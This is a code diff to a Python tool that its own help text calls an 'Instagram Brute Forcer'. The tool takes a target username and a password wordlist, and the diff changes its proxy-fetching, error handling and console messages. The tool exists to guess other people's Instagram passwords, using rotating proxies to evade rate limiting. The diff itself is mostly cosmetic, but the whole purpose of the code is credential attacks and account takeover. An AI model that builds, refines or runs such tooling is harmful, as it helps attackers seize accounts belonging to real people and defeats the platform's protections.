@@ -165,6 +165,8 @@ def check_connection():
             return True
         else:
             return False
+    except requests.exceptions.ConnectionError:
+        raise requests.exceptions.ConnectionError   
     except:
         return False
 
@@ -174,7 +176,9 @@ def get_proxies(verbose, proxy_limit):
     try:
         import bs4
     except:
+        printit("[!] Installing required modules for proxy\n", coledt=[1, 49, 92], line_up=True, space_down=True)
         install('beautifulsoup4')
+        printit("[+] Modules installed successfully\n", coledt=[1, 49, 92], space_up=True, line_down=True)
         import bs4
 
     # Fetching proxy list
@@ -194,11 +198,11 @@ def get_proxies(verbose, proxy_limit):
     except:
         printit('[!] Failed to fetch proxy list', coledt=[1, 49, 91])
         while True:
-            print("\n[?] Continue without proxy? (y/n): ", end='')
+            print("[?] Continue without proxy? (y/n): ", end='')
             choice = input().lower()
             if choice == 'y':
-                proxy = False
-                return
+                print()
+                return False
             elif choice == 'n':
                 raise KeyboardInterrupt()
             else:
@@ -245,13 +249,14 @@ def print_login_failed(password, verbose, proxy, proxies, login_response_status_
 
 def main():
     # Taking command line arguments using argparse
-    parser = argparse.ArgumentParser(description='(s41r4j:igbf)> Instagram Brute Force')
+    parser = argparse.ArgumentParser(description='(s41r4j:igbf)> Instagram Brute Forcer')
     parser.add_argument('-u', '--username', help='instagram username (*required)', metavar='USERNAME')
     parser.add_argument('-w', '--wordlist', help='password wordlist (*required)', metavar='WORDLIST PATH')
     parser.add_argument('-t', '--timeout', help='timeout between each request in secs (default: 2)', default=2, type=int)
     parser.add_argument('-v', '--verbose', help='verbose mode (displays failed logins and more)', action='store_true', default=False)
     parser.add_argument('-p', '--proxy', help='use ip rotating proxy (additinal library required)', action='store_true', default=False)
     parser.add_argument('-l', '--proxy-limit', help='limit the number of proxies to use (default: 300; max: 300; min: 1)', default=300, type=int)
+    # parser.add_argument('-g', '--get', help='update the program to the latest version', action='store_true', default=False)
     args = parser.parse_args()
 
     # Assigning the arguments to variables
@@ -316,6 +321,7 @@ def main():
 
     # Generating proxy list
     if proxy: proxies = get_proxies(verbose, proxy_limit)
+    if not proxies: proxy = False
 
     # Starting the brute force
     printit('[#] Starting the brute force...\n', coledt=[1, 49, 91])
@@ -449,8 +455,8 @@ if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print('\n[!] Exiting...')
+        printit('\n\n[:)] Exiting the program...', coledt=[1, 49, 92], line_down=True)
         sys.exit()
     except requests.exceptions.ConnectionError:
-        print("\n[!] Internet connection is required!\n[!] Exiting...")
+        printit("\n[!] Internet connection is required!\n[;)] Exiting the program...", coledt=[1, 49, 91], line_down=True)
         sys.exit()
